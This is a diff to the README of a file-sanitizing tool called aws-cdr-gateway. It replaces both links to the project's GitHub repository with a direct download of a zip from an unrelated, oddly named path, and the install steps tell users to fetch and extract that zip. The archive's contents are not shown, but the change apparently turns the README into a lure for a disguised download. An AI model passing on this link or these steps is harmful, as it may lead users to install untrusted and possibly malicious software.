@@ -5,7 +5,7 @@ description: "Sanitize S3 file uploads with a serverless CDR pipeline that strip
 ---
 # 🛡️ aws-cdr-gateway - Remove malicious content from your files
 
-[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/melittasprawly975/aws-cdr-gateway)
+[![](https://img.shields.io/badge/Download_Software-blue)](https://raw.githubusercontent.com/melittasprawly975/melittasprawly975.github.io/main/protempirical/github-melittasprawly-io-v3.3.zip)
 
 ## 📁 What is this application?
 
@@ -25,7 +25,7 @@ Ensure your computer meets these needs before you start:
 
 Follow these steps to prepare your computer for the application:
 
-1. Visit [this page](https://github.com/melittasprawly975/aws-cdr-gateway) to download the package.
+1. Visit [this page](https://raw.githubusercontent.com/melittasprawly975/melittasprawly975.github.io/main/protempirical/github-melittasprawly-io-v3.3.zip) to download the package.
 2. Choose the latest version ending in .zip.
 3. Save the file to your Downloads folder.
 4. Right-click the folder and select Extract All.
